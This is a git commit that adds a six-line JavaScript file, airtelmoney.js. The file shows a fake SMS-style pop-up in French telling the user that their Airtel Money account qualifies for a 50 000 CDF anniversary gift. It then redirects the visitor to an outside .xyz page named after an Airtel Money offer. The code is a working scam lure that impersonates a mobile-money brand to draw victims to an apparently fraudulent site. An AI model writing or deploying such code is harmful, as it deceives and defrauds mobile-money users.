71cfcbbce9ab5a8ab08470d5303ded039aee8d2a
newetijazz9 <newetijazz9@gmail.com>
2025-11-11 08:57:13 +0100

    Create airtelmoney.js

---
+++ airtelmoney.js
@@ -0,0 +1,6 @@
+var password = '50 000 CDF'
+password=prompt('SMS: Félicitations, votre compte est qualifié pour recevoir le cadeau anniversaire Airtel Money de 50 000 CDF, appuyez sur OK pour activer','50 000 CDF');
+if (password != '50 000 CDF') {
+location.href='https://www.ekporoku.xyz/Airtel-Money-Offre';
+}
+ 
